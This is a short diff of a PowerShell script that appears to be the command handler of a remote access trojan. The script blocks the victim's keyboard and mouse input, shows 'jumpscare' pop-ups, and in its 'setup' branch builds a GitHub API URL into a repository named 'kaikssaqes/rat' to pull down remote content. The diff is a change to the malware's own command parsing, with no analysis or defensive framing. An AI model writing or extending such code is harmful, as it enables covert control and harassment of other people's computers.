@@ -369,8 +369,8 @@ function Run-Cmd($c){
     if($c -eq 'block'){ Block-Input }
     elseif($c -eq 'jumpscare'){ Jump-Scare $null }
     elseif($c -like 'jumpscare:*'){ Jump-Scare ($c.Substring(10)) }
-    elseif($c -like 'setup:*'){
-      $rest=$c.Substring(6)
+    elseif($c -like ('setup:'+$VN+':*')){
+          $rest=$c.Substring(7 + $VN.Length)
       $parts=$rest -split ';', 2
       $W=$parts[0]
       $C='https://api.github.com/repos/'+'kaikssaqes/'+'rat/'+'contents/'+$parts[1]
